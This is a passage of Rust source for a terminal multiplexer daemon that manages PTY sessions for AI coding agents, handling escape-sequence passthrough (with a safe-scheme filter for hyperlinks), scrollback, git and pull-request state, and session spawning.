/// PTY session: one PTY + one `vt100::Parser` + state-inference timer.
///
/// Each session owns a PTY pair, a child process (agent or shell), and
/// the `vt100::Parser` whose `Screen` mirrors the agent's view. The
/// parser is the source of truth for re-rendering on tab switch, pane
/// switch, and client reattach.
///
/// The parser is constructed with an `OscCapture` callback that
/// preserves OSC and unhandled-CSI byte sequences as the agent emits
/// them. The daemon drains the captured payloads after each PTY chunk
/// and forwards them to the attached client *only* when the session
/// owns the focused pane in the active tab — the routing rule the
/// roadmap calls out under "OSC passthrough". Without this layer the
/// `vt100` parser silently consumes OSC, so agent desktop
/// notifications (OSC 9), clipboard writes (OSC 52), window titles
/// (OSC 0/1/2), hyperlinks (OSC 8), kitty-keyboard protocol switches
/// (`\x1b[>{n}u`), synchronised output markers (`\x1b[?2026h/l`), and
/// every other terminal extension the operator's outer terminal
/// understands would vanish at the multiplexer boundary.
use std::collections::VecDeque;
use std::io::Write as _;
use std::path::Path;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{Arc, Mutex};

use anyhow::{Context, Result};
use portable_pty::{ChildKiller, CommandBuilder, MasterPty, PtySize, native_pty_system};
use tokio::sync::mpsc;
use vt100::{Callbacks, Screen};

use crate::protocol::AgentState;

static NEXT_ID: AtomicU64 = AtomicU64::new(1);
const BLOCKED_AFTER: std::time::Duration = std::time::Duration::from_secs(3);

/// Lines of scrollback every PTY session retains. ~1.5 MB worst-case
/// per session at 200 cols. Empty cells cost less. Operators need
/// scrollback to read Codex / Claude responses that exceed one
/// viewport, so this stays generous.
pub const SCROLLBACK_LEN: usize = 10_000;

pub const SESSION_ENV_PASSTHROUGH: &[&str] = &[
    "GIT_AUTHOR_NAME",
    "GIT_AUTHOR_EMAIL",
    "GH_TOKEN",
    "JACKIN_DEBUG",
    "JACKIN_GIT_COAUTHOR_TRAILER",
    "JACKIN_GIT_DCO",
    // Per-tab provider injection — Anthropic-compatible backends (Claude Code).
    // Listed here so env_for_spawn's allowlist accepts them as overrides when the
    // operator picks an alternative provider in the AgentPicker flow.
    "ANTHROPIC_AUTH_TOKEN",
    "ANTHROPIC_BASE_URL",
    // Model-tier mapping so Claude Code maps its internal tiers to provider model names.
    "ANTHROPIC_DEFAULT_OPUS_MODEL",
    "ANTHROPIC_DEFAULT_SONNET_MODEL",
    "ANTHROPIC_DEFAULT_HAIKU_MODEL",
    // Provider operational env vars.
    "API_TIMEOUT_MS",
    "CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC",
    // MiniMax key forwarded into Codex so its config.toml `env_key = "MINIMAX_API_KEY"` resolves.
    "MINIMAX_API_KEY",
    // Kimi key — serves both the Kimi Code runtime agent and the Kimi Claude Code provider.
    "KIMI_CODE_API_KEY",
];

/// Per-pane cap on the kitty-keyboard push depth. A buggy or hostile
/// agent that loops `\x1b[>1u` would otherwise grow `kitty_kb_stack`
/// without bound. 64 is well past any real terminal program's nested
/// keymap-mode depth.
pub const KITTY_KB_STACK_CAP: usize = 64;

#[derive(Debug, Clone, Copy)]
struct InlineScrollRegion {
    top: u16,
    bottom: u16,
}

impl InlineScrollRegion {
    fn full_screen(rows: u16) -> Self {
        Self {
            top: 0,
            bottom: rows.saturating_sub(1),
        }
    }

    fn resize(&mut self, rows: u16) {
        if rows == 0 || self.top >= rows || self.bottom >= rows || self.top >= self.bottom {
            *self = Self::full_screen(rows);
        }
    }

    fn set_decstbm(&mut self, rows: u16, top: u16, bottom: u16) {
        if rows == 0 {
            *self = Self::full_screen(rows);
            return;
        }

        let top = top.max(1).saturating_sub(1);
        let bottom = bottom.max(1).saturating_sub(1).min(rows.saturating_sub(1));
        if top < bottom {
            self.top = top;
            self.bottom = bottom;
        } else {
            *self = Self::full_screen(rows);
        }
    }

    fn top_anchored_bottom(self, rows: u16) -> Option<u16> {
        (rows > 1 && self.top == 0 && self.bottom < rows.saturating_sub(1)).then_some(self.bottom)
    }
}

struct InlineScrollRegionTracker {
    parser: vte::Parser,
    region: InlineScrollRegion,
}

#[derive(Default)]
struct InlineScrollActions {
    scroll_up: usize,
    erase_display: Option<u16>,
}

impl InlineScrollRegionTracker {
    fn new(rows: u16) -> Self {
        Self {
            parser: vte::Parser::new(),
            region: InlineScrollRegion::full_screen(rows),
        }
    }

    fn resize(&mut self, rows: u16) {
        self.region.resize(rows);
    }

    fn reset(&mut self, rows: u16) {
        self.region = InlineScrollRegion::full_screen(rows);
    }

    fn top_anchored_bottom(&self, rows: u16) -> Option<u16> {
        self.region.top_anchored_bottom(rows)
    }

    fn advance(&mut self, byte: u8, screen_rows: u16) -> InlineScrollActions {
        let mut actions = InlineScrollActions::default();
        let mut performer = InlineScrollRegionPerformer {
            region: &mut self.region,
            screen_rows,
            actions: &mut actions,
        };
        self.parser
            .advance(&mut performer, std::slice::from_ref(&byte));
        actions
    }
}

struct InlineScrollRegionPerformer<'a> {
    region: &'a mut InlineScrollRegion,
    screen_rows: u16,
    actions: &'a mut InlineScrollActions,
}

fn first_csi_value(params: &vte::Params) -> Option<u16> {
    params
        .iter()
        .next()
        .and_then(|param| param.first())
        .copied()
}

fn csi_count(params: &vte::Params) -> usize {
    usize::from(
        first_csi_value(params)
            .filter(|&value| value != 0)
            .unwrap_or(1),
    )
}

impl vte::Perform for InlineScrollRegionPerformer<'_> {
    fn csi_dispatch(
        &mut self,
        params: &vte::Params,
        intermediates: &[u8],
        ignore: bool,
        action: char,
    ) {
        if ignore || !intermediates.is_empty() {
            return;
        }

        match action {
            'J' => {
                self.actions.erase_display = Some(first_csi_value(params).unwrap_or(0));
            }
            'S' => {
                self.actions.scroll_up = csi_count(params);
            }
            'r' => {
                let mut values = params
                    .iter()
                    .map(|param| param.first().copied().unwrap_or(0));
                let top = values.next().filter(|&value| value != 0).unwrap_or(1);
                let bottom = values
                    .next()
                    .filter(|&value| value != 0)
                    .unwrap_or(self.screen_rows);
                self.region.set_decstbm(self.screen_rows, top, bottom);
            }
            _ => {}
        }
    }
}

/// True when an OSC 8 `URI` payload is safe to forward to the
/// operator's host terminal. The empty URI is a terminator (closing
/// a hyperlink range), so it always passes; otherwise the scheme
/// must be `http`, `https`, or `mailto`. `javascript:`, `data:`,
/// `file://`, and anything else are dropped — a compromised agent
/// could otherwise script the operator's terminal emulator or
/// reference operator-side files on click.
fn osc8_uri_is_safe(uri: &[u8]) -> bool {
    if uri.is_empty() {
        return true;
    }
    let Ok(s) = std::str::from_utf8(uri) else {
        return false;
    };
    let lower = s.trim().to_ascii_lowercase();
    lower.starts_with("http://") || lower.starts_with("https://") || lower.starts_with("mailto:")
}

/// Parse an `OSC 7` payload into a local-filesystem path. `OSC 7`
/// canonically arrives as `file://<host>/<percent-encoded-path>`;
/// `url::Url` does the percent-decoding and host-stripping in one
/// pass. Returns `None` for any payload that does not parse as a
/// `file://` URL — silently trusting arbitrary text would let an
/// agent overwrite the pane title with whatever it pleased.
fn parse_osc7(payload: &str) -> Option<String> {
    let url = url::Url::parse(payload).ok()?;
    if url.scheme() != "file" {
        return None;
    }
    url.to_file_path()
        .ok()
        .map(|p| p.to_string_lossy().into_owned())
}

/// Per-OSC operator opt-out switches. All default to `allow`; the
/// values `deny`, `off`, `no` (case-sensitive) turn the matching
/// passthrough off when the operator runs an untrusted role. tmux
/// exposes the same family as `set-clipboard on|off` plus
/// `allow-passthrough` for OSC; jackin keeps the surface per-OSC so
/// the operator can leave the agent's terminal title alone but block
/// notification spam, or vice versa.
const ENV_OSC52: &str = "JACKIN_OSC52";
const ENV_OSC_TITLE: &str = "JACKIN_OSC_TITLE";
const ENV_OSC_NOTIFY: &str = "JACKIN_OSC_NOTIFY";
const ENV_OSC_HYPERLINK: &str = "JACKIN_OSC_HYPERLINK";

#[derive(Debug, Clone, Copy)]
pub struct OscPolicy {
    allow_title: bool,
    allow_osc52: bool,
    allow_notify: bool,
    allow_hyperlink: bool,
}

impl Default for OscPolicy {
    fn default() -> Self {
        Self {
            allow_title: true,
            allow_osc52: true,
            allow_notify: true,
            allow_hyperlink: true,
        }
    }
}

impl OscPolicy {
    /// Read policy from environment. Cached at `Session::spawn` time so a
    /// background pane cannot toggle the gate at runtime by `export`ing
    /// into a focused shell.
    pub fn from_env() -> Self {
        Self {
            allow_title: !is_env_deny(ENV_OSC_TITLE),
            allow_osc52: !is_env_deny(ENV_OSC52),
            allow_notify: !is_env_deny(ENV_OSC_NOTIFY),
            allow_hyperlink: !is_env_deny(ENV_OSC_HYPERLINK),
        }
    }

    pub fn allow_title(self) -> bool {
        self.allow_title
    }
    pub fn allow_osc52(self) -> bool {
        self.allow_osc52
    }
    pub fn allow_notify(self) -> bool {
        self.allow_notify
    }
    pub fn allow_hyperlink(self) -> bool {
        self.allow_hyperlink
    }

    /// Test-only constructor with every passthrough gate closed.
    /// Production code must call `from_env()`; the `#[doc(hidden)]`
    /// attribute hides this from rustdoc and the `for_test_` prefix
    /// flags intent to readers. Cargo cannot list a crate in its own
    /// `[dev-dependencies]` with a feature flag, so a `#[cfg(feature
    /// = "test-helpers")]` gate would break the default `cargo test`
    /// invocation that integration tests rely on.
    #[doc(hidden)]
    pub fn for_test_deny_all() -> Self {
        Self {
            allow_title: false,
            allow_osc52: false,
            allow_notify: false,
            allow_hyperlink: false,
        }
    }
}

fn is_env_deny(name: &str) -> bool {
    matches!(
        std::env::var(name).as_deref(),
        Ok("deny") | Ok("off") | Ok("no")
    )
}

pub fn next_id() -> u64 {
    NEXT_ID.fetch_add(1, Ordering::Relaxed)
}

/// `vt100::Callbacks` impl that captures OSC and unhandled-CSI byte
/// sequences for later focused-pane forwarding to the attached client.
///
/// No `Default` impl on purpose: every construction must spell out an
/// `OscPolicy` so a forgotten policy at the call site does not silently
/// re-enable passthrough.
pub struct OscCapture {
    pending: Vec<Vec<u8>>,
    policy: OscPolicy,
    title: Option<String>,
    icon_name: Option<String>,
    /// Kitty keyboard protocol stack pushed by this session. Each
    /// `\x1b[>{n}u` from the PTY appends; `\x1b[<{n}u` pops. The
    /// daemon mirrors the *top* of this stack onto the outer
    /// terminal whenever this session becomes the focused pane and
    /// pops it back to the previous stack on focus-out. Empty stack
    /// = "agent never asked for kitty kb" → outer terminal stays in
    /// plain CSI mode.
    pub(crate) kitty_kb_stack: Vec<u16>,
    /// Whether the session enabled DEC private mode `?1004` (focus
    /// event reporting). vt100 does not track this; we capture it
    /// here from `unhandled_csi` and consult it before synthesising
    /// `\x1b[I` / `\x1b[O` on focus swap.
    pub(crate) focus_events: bool,
    /// Xterm modifyOtherKeys level requested by the focused program
    /// (`CSI > 4 ; <n> m`). Full-screen agents may leave this enabled
    /// when they return to a shell, making plain text arrive as CSI-u
    /// fragments. Track it so alternate-screen exit can reset it.
    pub(crate) modify_other_keys: Option<u16>,
    /// Most recently announced working directory, captured from
    /// `OSC 7` (`\x1b]7;file://<host>/<path>\x07`). Modern shells
    /// (zsh + starship, bash + PROMPT_COMMAND, fish) emit this on
    /// every prompt; the daemon surfaces it as the pane box title
    /// when the agent has not set an `OSC 2` of its own, matching
    /// zellij's "Shell title shows cwd" convention.
    pub(crate) cwd: Option<String>,
}

impl OscCapture {
    pub fn with_policy(policy: OscPolicy) -> Self {
        Self {
            pending: Vec::new(),
            policy,
            title: None,
            icon_name: None,
            kitty_kb_stack: Vec::new(),
            focus_events: false,
            modify_other_keys: None,
            cwd: None,
        }
    }

    pub fn drain(&mut self) -> Vec<Vec<u8>> {
        std::mem::take(&mut self.pending)
    }

    /// Read-only access for tests and the daemon. Mutation flows
    /// through the `vt100::Callbacks` impl below — never let
    /// outside code flip these flags directly.
    pub fn focus_events(&self) -> bool {
        self.focus_events
    }

    pub fn kitty_kb_stack(&self) -> &[u16] {
        &self.kitty_kb_stack
    }

    pub fn cwd(&self) -> Option<&str> {
        self.cwd.as_deref()
    }

    pub fn title(&self) -> Option<&str> {
        self.title.as_deref()
    }

    pub fn icon_name(&self) -> Option<&str> {
        self.icon_name.as_deref()
    }

    pub fn pending(&self) -> &[Vec<u8>] {
        &self.pending
    }
}

impl Callbacks for OscCapture {
    fn set_window_title(&mut self, _: &mut Screen, title: &[u8]) {
        if let Ok(s) = std::str::from_utf8(title) {
            self.title = Some(s.to_string());
        }
        if self.policy.allow_title() {
            let mut osc = b"\x1b]2;".to_vec();
            osc.extend_from_slice(title);
            osc.extend_from_slice(b"\x07");
            self.pending.push(osc);
        }
    }

    fn set_window_icon_name(&mut self, _: &mut Screen, icon_name: &[u8]) {
        if let Ok(s) = std::str::from_utf8(icon_name) {
            self.icon_name = Some(s.to_string());
        }
        if self.policy.allow_title() {
            let mut osc = b"\x1b]1;".to_vec();
            osc.extend_from_slice(icon_name);
            osc.extend_from_slice(b"\x07");
            self.pending.push(osc);
        }
    }

    fn copy_to_clipboard(&mut self, _: &mut Screen, ty: &[u8], data: &[u8]) {
        if self.policy.allow_osc52() {
            let mut osc = b"\x1b]52;".to_vec();
            osc.extend_from_slice(ty);
            osc.push(b';');
            osc.extend_from_slice(data);
            osc.extend_from_slice(b"\x07");
            self.pending.push(osc);
        }
    }

    fn unhandled_osc(&mut self, _: &mut Screen, params: &[&[u8]]) {
        let ps: &[u8] = params.first().copied().unwrap_or(&[]);
        // OSC 7 — current working directory. Shells emit
        // `\x1b]7;file://<host>/<percent-encoded-path>\x07` on
        // every prompt. Capture into `self.cwd` for the pane-title
        // surface and STOP — never forward OSC 7 to the attached
        // client. The host terminal would otherwise interpret it as
        // a cwd hint and remember the container's path, breaking
        // `Cmd+T new tab` on the host. (Pollutes host state per
        // CLAUDE.md "Never mutate the host machine silently".)
        if ps == b"7" {
            if let Some(rest) = params.get(1)
                && let Ok(s) = std::str::from_utf8(rest)
                && let Some(path) = parse_osc7(s)
            {
                self.cwd = Some(path);
            }
            return;
        }
        // Operator-gated OSC families.
        if ps == b"9" && !self.policy.allow_notify() {
            return;
        }
        if ps == b"8" {
            if !self.policy.allow_hyperlink() {
                return;
            }
            // OSC 8 carries `<params>;<URI>` (`params` may be empty
            // or `id=...`). Reject any URI whose scheme is not in
            // the safe allowlist — `javascript:` would let a
            // compromised agent script the operator's host terminal
            // emulator on click, and `file://` paths can point at
            // anything the operator can read. Forward the OSC only
            // when the URI is empty (terminator), http(s), or
            // mailto.
            if !osc8_uri_is_safe(params.get(2).copied().unwrap_or(&[])) {
                return;
            }
        }
        // OSC 0 sets both title and icon. Route under the title knob.
        if ps == b"0" && !self.policy.allow_title() {
            return;
        }
        let mut osc = b"\x1b]".to_vec();
        for (i, p) in params.iter().enumerate() {
            if i > 0 {
                osc.push(b';');
            }
            osc.extend_from_slice(p);
        }
        osc.extend_from_slice(b"\x07");
        self.pending.push(osc);
    }

    fn unhandled_csi(
        &mut self,
        _: &mut Screen,
        i1: Option<u8>,
        i2: Option<u8>,
        params: &[&[u16]],
        c: char,
    ) {
        // Xterm window manipulation / report commands (`CSI ... t`)
        // belong to the pane geometry boundary, not to outer-terminal
        // passthrough. If a focused TUI's `CSI 18t` reaches Ghostty,
        // Ghostty replies on the attach client's stdin with
        // `CSI 8;rows;cols t`; a resize burst can then route those
        // replies into whichever pane is focused and shells execute
        // the fragments as commands. Pane dimensions already flow
        // through PTY resize (`TIOCSWINSZ`) and `Screen::set_size`.
        // Keep this paired with the input parser's matching drop for
        // any stale replies already in flight.
        if c == 't' {
            return;
        }
        // Kitty-keyboard push (`\x1b[>{n}u`) and pop (`\x1b[<{n}u`)
        // are tracked per-pane in `OscCapture::kitty_kb_stack` and
        // re-applied to the outer terminal on focus swap by
        // `Session::current_mode_state`. Forwarding them through
        // this generic passthrough would race with the focus-swap
        // restore: an agent that pushes `\x1b[>1u` while focused
        // must NOT leave the outer terminal in that mode the
        // moment focus moves to a shell.
        if c == 'u' && i1 == Some(b'>') {
            let flags = params.first().and_then(|p| p.first()).copied().unwrap_or(1);
            if self.kitty_kb_stack.len() < KITTY_KB_STACK_CAP {
                self.kitty_kb_stack.push(flags);
            }
            return;
        }
        if c == 'u' && i1 == Some(b'<') {
            let n = params.first().and_then(|p| p.first()).copied().unwrap_or(1) as usize;
            for _ in 0..n.min(self.kitty_kb_stack.len()) {
                self.kitty_kb_stack.pop();
            }
            return;
        }
        // `?1004` is intercepted because vt100 does not surface
        // the flag and the daemon's focus-swap restore needs it.
        if (c == 'h' || c == 'l')
            && i1 == Some(b'?')
            && let Some(first) = params.first().and_then(|p| p.first())
            && *first == 1004
        {
            self.focus_events = c == 'h';
            return;
        }
        if c == 'm'
            && i1 == Some(b'>')
            && let Some(first) = params.first().and_then(|p| p.first())
            && *first == 4
        {
            self.modify_other_keys = params
                .get(1)
                .and_then(|p| p.first())
                .copied()
                .filter(|level| *level != 0);
        }
        // Re-emit verbatim. vt100 routes here only for CSI sequences
        // it does not itself handle — `modifyOtherKeys`
        // (`\x1b[>4;{n}m`) and any other extension the outer
        // terminal understands but `vt100` does not.
        let mut buf = b"\x1b[".to_vec();
        if let Some(b) = i1 {
            buf.push(b);
        }
        if let Some(b) = i2 {
            buf.push(b);
        }
        for (idx, sub) in params.iter().enumerate() {
            if idx > 0 {
                buf.push(b';');
            }
            for (jdx, n) in sub.iter().enumerate() {
                if jdx > 0 {
                    buf.push(b':');
                }
                let _ = write!(buf, "{}", n);
            }
        }
        let mut tmp = [0u8; 4];
        buf.extend_from_slice(c.encode_utf8(&mut tmp).as_bytes());
        self.pending.push(buf);
    }
}

/// Resolved provider a session was spawned with. Label and env overrides
/// travel together (both derived from one `jackin_protocol::Provider` at
/// spawn time) so a split can faithfully inherit the source pane's provider
/// without the label drifting from its redirect env.
#[derive(Debug, Clone)]
pub struct SessionProvider {
    pub label: String,
    pub env_overrides: Vec<(String, String)>,
}

pub struct Session {
    pub label: String,
    pub agent: Option<String>,
    pub provider: Option<SessionProvider>,
    pub state: AgentState,
    pub parser: vt100::Parser<OscCapture>,
    pub input_tx: mpsc::UnboundedSender<Vec<u8>>,
    pub pty_master: Arc<Mutex<Box<dyn MasterPty + Send>>>,
    child_killer: Arc<Mutex<Box<dyn ChildKiller + Send + Sync>>>,
    pub last_output_at: std::time::Instant,
    /// Current scrollback view offset in lines from the live tail.
    /// `0` = following live output; `> 0` = paused, looking back.
    /// This is a unified offset across `vt100`'s native scrollback
    /// and the inline scrollback rows captured from top-anchored
    /// scroll regions.
    pub scrollback_offset: usize,
    /// Rows that leave the top of a top-anchored DECSTBM scroll
    /// region. Codex's inline TUI keeps the app in the primary screen
    /// and uses a top-anchored scroll region to push history off the
    /// top. `vt100` only records scrollback when the full screen
    /// scrolls, so jackin' captures those rows here before forwarding
    /// bytes to `vt100`.
    inline_scrollback: VecDeque<String>,
    inline_scroll_region_tracker: InlineScrollRegionTracker,
    /// Most recently observed value of `Screen::bracketed_paste()`.
    /// The daemon compares this to the post-feed state to detect
    /// transitions, then re-emits the matching `\x1b[?2004h/l`
    /// sequence to the attached client so the outer terminal wraps
    /// pastes with `\x1b[200~`/`\x1b[201~` markers. Without this,
    /// vt100 silently consumes the agent's `?2004h` and outer
    /// terminals never wrap pastes — multi-line clipboard content
    /// then arrives one `\n`-terminated chunk at a time, which agents
    /// treat as multiple separate messages.
    pub bracketed_paste_active: bool,
    /// `true` once the PTY has produced any output. Stays `false`
    /// during the brief window between `Session::spawn` and the
    /// child's first write — when the parser's cursor sits at (0, 0)
    /// of a blank primary screen with no agent UI drawn yet. The
    /// daemon gates `\x1b[?25h` (cursor visible) on this so a
    /// freshly-split pane does not paint a stray blinking cursor
    /// inside an otherwise empty rectangle.
    pub received_output: bool,
}

pub enum SessionEvent {
    Output {
        session_id: u64,
        data: Vec<u8>,
    },
    Exited {
        session_id: u64,
    },
    GitBranchContextRefreshRequested,
    GitBranchContextLoaded {
        request_id: u64,
        context: GitContext,
    },
    PullRequestContextLoaded {
        request_id: u64,
        branch: Option<BranchName>,
        /// HEAD captured at spawn so the cache entry is keyed on what
        /// the worker actually queried, not on mux state at apply time.
        head: Option<Oid>,
        outcome: PullRequestLookupOutcome,
    },
}

/// Resolved git state for the workspace workdir. Three meaningful
/// variants — `Absent` (no readable git metadata), `Branch` (on a
/// named branch, head resolves when the tip exists), `Detached`
/// (HEAD points directly at an OID with no branch ref). The old
/// `{branch: Option<String>, head: Option<String>}` shape allowed a
/// fourth nonsense state (`branch=None, head=Some` with no detached
/// context); the sum type removes it at the type level.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub enum GitContext {
    #[default]
    Absent,
    Detached {
        head: Oid,
    },
    Branch {
        name: BranchName,
        /// `None` while the branch ref hasn't resolved (unborn HEAD on
        /// a fresh `git init`, or a packed-refs miss before the next
        /// poll). The PR-context cache treats `None` and `Some` as
        /// distinct cache keys so cache busts on first-tip arrival.
        head: Option<Oid>,
    },
}

impl GitContext {
    pub fn branch_name(&self) -> Option<&BranchName> {
        match self {
            Self::Branch { name, .. } => Some(name),
            _ => None,
        }
    }

    pub fn head(&self) -> Option<&Oid> {
        match self {
            Self::Detached { head } => Some(head),
            Self::Branch {
                head: Some(head), ..
            } => Some(head),
            _ => None,
        }
    }

    pub fn is_present(&self) -> bool {
        !matches!(self, Self::Absent)
    }
}

/// Validated git object id. Constructed via `Oid::parse`, which
/// accepts the two on-disk hex lengths git uses today (40 = SHA-1,
/// 64 = SHA-256 via `git init --object-format=sha256`, opt-in since
/// git 2.29). All hex digits must be ASCII case-insensitive.
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub struct Oid(String);

impl Oid {
    pub fn parse(value: &str) -> Option<Self> {
        if matches!(value.len(), 40 | 64) && value.bytes().all(|b| b.is_ascii_hexdigit()) {
            Some(Self(value.to_string()))
        } else {
            None
        }
    }

    pub fn as_str(&self) -> &str {
        &self.0
    }
}

impl AsRef<str> for Oid {
    fn as_ref(&self) -> &str {
        &self.0
    }
}

impl std::ops::Deref for Oid {
    type Target = str;

    fn deref(&self) -> &str {
        &self.0
    }
}

impl std::fmt::Display for Oid {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(&self.0)
    }
}

/// Validated short branch name (no `refs/heads/` prefix, no
/// whitespace, non-empty). Constructed via `BranchName::parse`,
/// which strips a leading `refs/heads/` if present so callers can
/// pass either the symref target or the short name.
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub struct BranchName(String);

impl BranchName {
    pub fn parse(value: &str) -> Option<Self> {
        let stripped = value.strip_prefix("refs/heads/").unwrap_or(value);
        if stripped.is_empty() || stripped.chars().any(char::is_whitespace) {
            None
        } else {
            Some(Self(stripped.to_string()))
        }
    }

    pub fn as_str(&self) -> &str {
        &self.0
    }
}

impl AsRef<str> for BranchName {
    fn as_ref(&self) -> &str {
        &self.0
    }
}

impl std::ops::Deref for BranchName {
    type Target = str;

    fn deref(&self) -> &str {
        &self.0
    }
}

impl std::borrow::Borrow<str> for BranchName {
    fn borrow(&self) -> &str {
        &self.0
    }
}

impl std::fmt::Display for BranchName {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(&self.0)
    }
}

/// Outcome of a background `gh pr` lookup. The `Resolved` variant carries
/// the authoritative answer from `gh` — either the PR shape or `None`
/// meaning "no open PR on this head". `TransientFailure` means the
/// lookup itself failed (gh missing, auth not configured, timeout, JSON
/// parse error) and the previous cached value should be preserved.
/// Without this distinction every transient gh hiccup poisoned the
/// 60s cache with a fake "no PR" answer.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PullRequestLookupOutcome {
    Resolved(Option<Arc<PullRequestInfo>>),
    TransientFailure,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PullRequestInfo {
    pub number: u64,
    pub title: String,
    pub url: String,
    pub is_draft: bool,
    pub checks: Option<PullRequestChecks>,
}

impl PullRequestInfo {
    pub fn number_label(&self) -> String {
        format!("#{}", self.number)
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct PullRequestChecks {
    passing: usize,
    failing: usize,
    pending: usize,
    skipped: usize,
    cancelled: usize,
    total: usize,
}

impl PullRequestChecks {
    /// Build a check rollup from `gh pr checks` bucket strings.
    /// Unknown buckets count toward `skipped` so the
    /// `passing + failing + pending + skipped + cancelled == total`
    /// invariant always holds; that lets the renderer trust the
    /// counters and the summary text never reports a partial roll-up
    /// for an unrecognised state.
    pub fn from_buckets<I, S>(buckets: I) -> Self
    where
        I: IntoIterator<Item = S>,
        S: AsRef<str>,
    {
        let mut checks = Self::default();
        for bucket in buckets {
            checks.total += 1;
            match bucket.as_ref() {
                "pass" => checks.passing += 1,
                "fail" => checks.failing += 1,
                "pending" => checks.pending += 1,
                "skipping" => checks.skipped += 1,
                "cancel" => checks.cancelled += 1,
                _ => checks.skipped += 1,
            }
        }
        debug_assert_eq!(
            checks.passing + checks.failing + checks.pending + checks.skipped + checks.cancelled,
            checks.total,
            "PullRequestChecks counters must sum to total"
        );
        checks
    }

    #[cfg(test)]
    pub fn passing(&self) -> usize {
        self.passing
    }
    #[cfg(test)]
    pub fn failing(&self) -> usize {
        self.failing
    }
    #[cfg(test)]
    pub fn pending(&self) -> usize {
        self.pending
    }
    #[cfg(test)]
    pub fn skipped(&self) -> usize {
        self.skipped
    }
    #[cfg(test)]
    pub fn cancelled(&self) -> usize {
        self.cancelled
    }
    #[cfg(test)]
    pub fn total(&self) -> usize {
        self.total
    }

    pub fn summary(&self) -> String {
        if self.total == 0 {
            return "(none)".to_string();
        }
        if self.failing > 0 {
            return format!(
                "failing ({} fail, {} pass, {} pending)",
                self.failing, self.passing, self.pending
            );
        }
        if self.cancelled > 0 {
            return format!(
                "cancelled ({} cancel, {} pass, {} pending)",
                self.cancelled, self.passing, self.pending
            );
        }
        if self.pending > 0 {
            return format!("pending ({} pending, {} pass)", self.pending, self.passing);
        }
        if self.passing == self.total || self.passing + self.skipped == self.total {
            return format!("passing ({}/{})", self.passing, self.total);
        }
        format!(
            "{} pass, {} skip, {} total",
            self.passing, self.skipped, self.total
        )
    }
}

impl Session {
    pub fn spawn(
        label: impl Into<String>,
        agent: Option<String>,
        provider: Option<SessionProvider>,
        cmd: CommandBuilder,
        rows: u16,
        cols: u16,
        event_tx: mpsc::UnboundedSender<SessionEvent>,
    ) -> Result<(Self, u64)> {
        let pty_system = native_pty_system();
        let pair = pty_system
            .openpty(PtySize {
                rows,
                cols,
                pixel_width: 0,
                pixel_height: 0,
            })
            .context("failed to open PTY")?;

        let master = pair.master;
        let slave = pair.slave;

        let mut child = slave
            .spawn_command(cmd)
            .context("failed to spawn session process")?;
        let child_pid = child.process_id();
        if let Some(pid) = child_pid {
            crate::pid1::register_managed_child(pid);
        }
        let child_killer = Arc::new(Mutex::new(child.clone_killer()));
        drop(slave);

        let master: Arc<Mutex<Box<dyn MasterPty + Send>>> = Arc::new(Mutex::new(master));
        let master_for_read = Arc::clone(&master);
        let master_for_write = Arc::clone(&master);

        let (input_tx, mut input_rx) = mpsc::unbounded_channel::<Vec<u8>>();

        let sid = next_id();
        let event_tx_output = event_tx.clone();
        let event_tx_exit = event_tx.clone();
        let event_tx_writer_err = event_tx.clone();

        // PTY writer task. take_writer / lock failures emit Exited so the
        // daemon reaps the half-initialised session instead of leaving a
        // tab whose input keystrokes silently vanish. blocking_recv is
        // used instead of Handle::current().block_on(rx.recv()) because
        // the latter panics inside spawn_blocking on a current-thread
        // runtime ("Cannot block the current thread from within a runtime").
        tokio::task::spawn_blocking(move || {
            let writer = match master_for_write.lock() {
                Err(_) => {
                    crate::clog!("session {sid}: PTY master mutex poisoned; aborting writer task");
                    None
                }
                Ok(guard) => match guard.take_writer() {
                    Ok(w) => Some(w),
                    Err(e) => {
                        crate::clog!(
                            "session {sid}: take_writer failed: {e}; aborting writer task"
                        );
                        None
                    }
                },
            };
            let Some(mut writer) = writer else {
                if event_tx_writer_err
                    .send(SessionEvent::Exited { session_id: sid })
                    .is_err()
                {
                    crate::clog!(
                        "session {sid}: event channel closed — daemon will not reap this half-initialised session"
                    );
                }
                return;
            };
            while let Some(data) = input_rx.blocking_recv() {
                if let Err(e) = std::io::Write::write_all(&mut writer, &data) {
                    crate::clog!(
                        "session {sid}: PTY write error: {e} (errno={:?}); aborting writer",
                        e.raw_os_error()
                    );
                    if event_tx_writer_err
                        .send(SessionEvent::Exited { session_id: sid })
                        .is_err()
                    {
                        crate::clog!(
                            "session {sid}: event channel closed — daemon will not reap this dead writer"
                        );
                    }
                    return;
                }
            }
        });

        let event_tx_reader_err = event_tx.clone();
        tokio::task::spawn_blocking(move || {
            let reader = match master_for_read.lock() {
                Err(_) => {
                    crate::clog!("session {sid}: PTY master mutex poisoned; aborting reader task");
                    None
                }
                Ok(guard) => match guard.try_clone_reader() {
                    Ok(r) => Some(r),
                    Err(e) => {
                        crate::clog!(
                            "session {sid}: try_clone_reader failed: {e}; aborting reader task"
                        );
                        None
                    }
                },
            };
            let Some(mut reader) = reader else {
                if event_tx_reader_err
                    .send(SessionEvent::Exited { session_id: sid })
                    .is_err()
                {
                    crate::clog!(
                        "session {sid}: event channel closed — daemon will not reap this half-initialised session"
                    );
                }
                return;
            };
            let mut buf = [0u8; 4096];
            loop {
                match std::io::Read::read(&mut reader, &mut buf) {
                    Ok(0) => {
                        crate::clog!("session {sid}: PTY read EOF");
                        break;
                    }
                    Err(e) => {
                        crate::clog!(
                            "session {sid}: PTY read error: {e} (errno={:?})",
                            e.raw_os_error()
                        );
                        break;
                    }
                    Ok(n) => {
                        let data = buf[..n].to_vec();
                        if event_tx_output
                            .send(SessionEvent::Output {
                                session_id: sid,
                                data,
                            })
                            .is_err()
                        {
                            crate::clog!(
                                "session {sid}: event channel closed before PTY output drained; reader exiting"
                            );
                            break;
                        }
                    }
                }
            }
        });

        // Child-reaper task: blocks on `child.wait()` and emits the
        // Exited event the moment the child process is reaped, even
